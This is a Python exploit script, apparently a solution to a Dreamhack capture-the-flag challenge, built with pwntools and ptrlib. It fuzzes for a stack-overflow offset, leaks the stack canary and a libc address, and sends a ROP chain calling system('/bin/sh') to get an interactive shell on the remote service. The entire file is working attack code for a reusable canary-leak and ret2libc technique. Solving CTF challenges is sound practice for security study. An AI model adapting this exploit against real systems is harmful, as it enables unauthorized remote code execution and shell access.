#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./prob_patched")
libc = ptr.ELF("./libc.so.6")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("host3.dreamhack.games", 17788)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def fuzz():
    for i in range(0x200):
        io = connect()
        io.sendlineafter("> ", "2.")  # write
        io.sendline(b"A" * i + b".")
        io.recvuntil(b"> ")
        if b"stack smashing" in io.recvall(timeout=0.2):
            print(f"{i - 1}: ok")
            print(f"{i}: crashed!")
            break
        io.close()


def main():
    io = connect()

    __libc_start_call_main = unwrap(libc.symbol("__libc_start_call_main"))

    io.sendlineafter("> ", "2.")  # write
    io.send(b"A" * 0xEF + b"B" * 0x10)

    io.sendlineafter("> ", "1.")  # read

    io.recvuntil(b"B" * 0x10)
    io.recv(8)
    canary = ptr.u64(io.recv(8))
    ptr.logger.info(f"canary: {hex(canary)}")

    io.recvuntil(ptr.p64(1))
    libc.base = ptr.u64(io.recv(8)) - (__libc_start_call_main + 128)

    payload = b"A" * 23
    payload += ptr.p64(canary)
    payload = payload.ljust(39, b"B")
    payload += ptr.p64(next(libc.gadget("ret;")))
    payload += ptr.p64(next(libc.gadget("pop rdi; ret;")))
    payload += ptr.p64(next(libc.find("/bin/sh\0")))
    payload += ptr.p64(unwrap(libc.symbol("system")))
    payload += b"."

    io.sendlineafter(b"> ", payload)

    io.interactive()

    return


if __name__ == "__main__":
    # fuzz()
    main()
